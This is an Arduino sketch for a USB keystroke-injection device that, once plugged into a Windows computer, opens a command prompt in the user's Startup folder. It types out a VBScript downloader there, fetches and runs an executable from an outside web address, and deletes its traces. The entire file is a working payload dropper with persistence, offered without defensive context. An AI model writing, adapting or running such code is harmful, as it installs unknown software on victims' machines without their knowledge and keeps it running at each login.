#include <Keyboard.h>
#include <Mouse.h>

// Init function
void setup()
{
  // Begining the stream
  Keyboard.begin();


  delay(2000);


  Keyboard.press(KEY_LEFT_GUI);
  Keyboard.press(114);
  Keyboard.releaseAll();


  delay(1000);

  Keyboard.print("cmd");

  delay(1000);

  typeKey(KEY_RETURN);
  delay(200);
 Keyboard.print("cd C:/Users/%username%/AppData/Roaming/Microsoft/Windows/Start Menu/Programs/Startup");

  delay(50);

  typeKey(KEY_RETURN);
  
  delay(50);

  Keyboard.print("copy con download.vbs");
  delay(50);

  typeKey(KEY_RETURN);

  Keyboard.print("Set args = WScript.Arguments:a = split(args(0), \"/\")(UBound(split(args(0),\"/\")))");
  delay(50);
  typeKey(KEY_RETURN);

  Keyboard.print("Set objXMLHTTP = CreateObject(\"MSXML2.XMLHTTP\"):objXMLHTTP.open \"GET\", args(0), false:objXMLHTTP.send()");
  delay(50);
  typeKey(KEY_RETURN);

  Keyboard.print("If objXMLHTTP.Status = 200 Then");
  delay(50);
  typeKey(KEY_RETURN);

  Keyboard.print("Set objADOStream = CreateObject(\"ADODB.Stream\"):objADOStream.Open");
  delay(50);
  typeKey(KEY_RETURN);

  Keyboard.print("objADOStream.Type = 1:objADOStream.Write objXMLHTTP.ResponseBody:objADOStream.Position = 0");
  delay(50);
  typeKey(KEY_RETURN);

  Keyboard.print("Set objFSO = Createobject(\"Scripting.FileSystemObject\"):If objFSO.Fileexists(a) Then objFSO.DeleteFile a");
  delay(50);
  typeKey(KEY_RETURN);

  Keyboard.print("objADOStream.SaveToFile a:objADOStream.Close:Set objADOStream = Nothing");
  delay(50);
  typeKey(KEY_RETURN);

  Keyboard.print("End if:Set objXMLHTTP = Nothing:Set objFSO = Nothing");
  delay(50);
  typeKey(KEY_RETURN);

  Keyboard.press(KEY_LEFT_CTRL);
  Keyboard.press(67);
  Keyboard.releaseAll();
  delay(50);


  
  Keyboard.print("cscript download.vbs ");
  delay(50);


  Keyboard.press(34);
  Keyboard.releaseAll();
  Keyboard.print("https://egoldstudio.com/LAB/recent.exe");

  Keyboard.press(34);
  Keyboard.releaseAll();

  
  typeKey(KEY_RETURN);
delay(1000);
Keyboard.print("del download.vbs");
 typeKey(KEY_RETURN);


  Keyboard.print("recent.exe");
  delay(50);
  typeKey(KEY_RETURN);
  delay(50);
Keyboard.print("exit");
  delay(50);
  typeKey(KEY_RETURN);
  delay(800);
  Mouse.click(MOUSE_LEFT);
}

void typeKey(int key)
{
  Keyboard.press(key);
  delay(50);
  Keyboard.release(key);
}

// Unused
void loop() {}
